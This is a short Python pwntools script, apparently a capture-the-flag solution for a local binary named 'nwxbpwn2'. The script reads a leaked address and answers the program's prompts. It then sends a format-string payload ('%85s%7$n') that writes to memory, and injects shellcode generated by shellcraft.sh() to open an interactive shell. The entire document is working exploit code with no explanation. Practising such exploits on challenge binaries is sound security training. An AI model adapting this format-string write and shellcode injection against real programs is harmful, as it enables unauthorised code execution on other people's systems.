from pwn import*
context.log_level="debug"
context.binary = "./nwxbpwn2bac"

p=process("./nwxbpwn2")
pause()

p.recvuntil("secret[0] is ")

add=int(p.recv(8),16)
info("0x%x",add)
p.sendlineafter("be:",'a')
p.sendlineafter('up?:','east')
p.sendlineafter('leave(0)?:','1')

p.sendlineafter('address',str(add))
p.sendlineafter('wish is:','%85s%7$n')

p.sendlineafter('SPELL',asm(shellcraft.sh()))

p.interactive()
